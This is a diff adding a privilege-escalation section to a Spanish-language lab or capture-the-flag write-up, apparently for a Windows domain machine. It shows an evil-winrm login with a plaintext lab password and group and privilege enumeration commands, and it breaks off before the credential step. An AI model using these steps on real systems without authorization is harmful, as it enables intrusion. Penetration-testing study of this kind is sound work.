@@ -134,3 +134,16 @@ Nos aparece un `Pwn3d!` queriendo decir que este usuario pertenece al grupo de a
 `evil-winrm -i $IP -u 'fsmith' -p 'Thestrokes23'`
 
 Obtenemos una consola interactiva
+
+
+### Escalada de privilegios
+`whoami /priv`
+`whoami /all`
+
+Ver que mas usuarios pertenecen al grupo de `REMOTE MANAGEMENT`
+`net localgroup "Remote Management Users"`
+
+Encontramos al usuario `svc_loanmgr`
+
+Enumerar las credenciales del usuario:
+``
